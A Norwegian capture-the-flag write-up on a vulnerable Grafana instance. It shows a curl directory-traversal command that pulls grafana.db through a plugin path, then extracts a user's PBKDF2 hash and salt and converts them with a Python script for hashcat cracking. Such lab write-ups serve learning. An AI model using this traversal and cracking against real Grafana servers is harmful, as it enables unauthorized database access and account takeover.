# Grafana

## Hente databasen
Grafana-versjonen er sårbar for directory traversal.

Brukte scriptet på https://www.exploit-db.com/exploits/50581 til å identifisere hvilken plugin-path som fungerte, og så lastet ned med curl for å få databasen:

```
curl --path-as-is http://grafana.gojira.rocks:3000/public/plugins/mssql/../../../../../../../../../../../../../var/lib/grafana/grafana.db --output grafana.db
```
Kjørte bare strings på filen og greppet etter "revenue" for å finne datoen til første flagg.

## Knekke passord
Sergei ligger i users-tabellen:
```
password = 251e3e14c9120255181277687ee4f6031f93cc134812e6961d13dbdcfa234a989cb8b941e0c6c82e3cb57eaaf6c3a2bd0e10
salt = 2kpLTS5IUO
rands = pxm945Auhb
```

Grafana bruker PBKDF2-HMAC-SHA256 med 10k iterasjoner ([lenke](https://nusgreyhats.org/posts/writeups/a-not-so-deep-dive-in-to-grafana-cve-2021-43798/)):

```go
func EncodePassword(password string, salt string) (string, error) {
	newPasswd := pbkdf2.Key([]byte(password), []byte(salt), 10000, 50, sha256.New)
	return hex.EncodeToString(newPasswd), nil
}
```

Hashcat forventer at både salt og passord er base64 i denne modusen. Har et script lagd ifbm en HTB-maskin (Health) som konverterer:
```python
#!/usr/bin/python3
import sys, base64, binascii

pwd = bytes(sys.argv[1], 'utf-8')
salt = bytes(sys.argv[2], 'utf-8')

salt_b64 = (base64.b64encode(salt)[:14]).decode('utf-8')
pwd_b64 = base64.b64encode(binascii.unhexlify(pwd)).decode('utf-8')

print("sha256:10000:{}:{}".format(salt_b64, pwd_b64))
```
```
sha256:10000:MmtwTFRTNUlVTw:JR4+FMkSAlUYEndofuT2Ax+TzBNIEuaWHRPb3PojSpicuLlB4MbILjy1fqr2w6K9DhA=
```

Kjører hashcat med rockyou som ordliste, men her var det bom.

> ### Oppdatering
> Her lærte jeg etterpå at passordet var kort, men det måtte bruteforces: "rør123" Sergei har tydeligvis gått på norskkurs :-&